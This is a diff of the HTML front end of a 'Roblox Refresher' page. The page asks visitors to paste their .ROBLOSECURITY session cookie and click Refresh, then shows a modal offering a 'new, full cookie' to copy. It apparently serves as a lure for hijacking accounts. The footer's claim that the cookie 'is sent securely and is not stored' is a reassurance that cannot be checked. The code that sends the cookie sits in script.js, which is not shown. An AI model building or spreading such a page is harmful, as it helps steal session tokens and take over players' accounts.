@@ -1,40 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Roblox Refresher</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
-  <script src="script.js" defer></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Roblox Refresher</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script src="script.js" defer></script>
 </head>
 <body>
-  <main class="wrap">
-    <header class="brand">
-      <div class="brand-badge" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3.6v6.2c0 5.1-3.1 9.1-7 10.7-3.9-1.6-7-5.6-7-10.7V6.1l7-3.6z" stroke="currentColor" stroke-width="1.6" /><path d="M12 6.2v13.6" stroke="currentColor" stroke-opacity="0.25" stroke-width="1.2" /></svg>
-      </div>
-      <h1>Roblox Refresher</h1>
-      <p class="sub">Secure • Fast • Reliable</p>
-    </header>
+    <main class="wrap">
+        <header class="brand">
+            <div class="brand-badge" aria-hidden="true">
+                <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3.6v6.2c0 5.1-3.1 9.1-7 10.7-3.9-1.6-7-5.6-7-10.7V6.1l7-3.6z" stroke="currentColor" stroke-width="1.6" /><path d="M12 6.2v13.6" stroke="currentColor" stroke-opacity="0.25" stroke-width="1.2" /></svg>
+            </div>
+            <h1>Roblox Refresher</h1>
+            <p class="sub">Secure • Fast • Reliable</p>
+        </header>
 
-    <section class="card">
-      <p class="label">.ROBLOSECURITY Cookie</p>
-      <input id="cookieInput" class="input" type="password" placeholder="Paste your cookie here..." />
+        <section class="card">
+            <p class="label">.ROBLOSECURITY Cookie</p>
+            <input id="cookieInput" class="input" type="password" placeholder="Paste your cookie here..." />
+            <div class="row">
+                <button class="btn" type="button" id="refreshButton">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 7.5v9l8-4.5-8-4.5z" stroke-width="1.8" stroke-linejoin="round"/></svg>
+                    Refresh
+                </button>
+            </div>
+            <div id="result" class="result" style="display:none;"></div>
+        </section>
 
-      <div class="row">
-        <button class="btn" type="button" id="refreshButton">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 7.5v9l8-4.5-8-4.5z" stroke-width="1.8" stroke-linejoin="round"/></svg>
-          Refresh
-        </button>
-      </div>
-      
-      <div id="result" class="result" style="display:none;"></div>
-    </section>
+        <p class="footer"><span>Tip:</span> Your cookie is sent securely and is not stored.</p>
+    </main>
 
-    <p class="footer"><span>Tip:</span> Your cookie is sent securely and is not stored.</p>
-  </main>
+    <!-- === POP-UP MODAL STRUCTURE === -->
+    <div class="modal-overlay" id="cookieModal">
+        <div class="modal-content">
+            <h2 class="modal-title">Success!</h2>
+            <p class="modal-subtitle">Your new, full cookie is ready below.</p>
+            <textarea id="newCookieOutput" class="modal-cookie-textarea" readonly></textarea>
+            <div class="modal-actions">
+                <button id="copyCookieBtn" class="modal-copy-btn">Copy Cookie</button>
+                <button id="closeModalBtn" class="modal-close-btn">Close</button>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
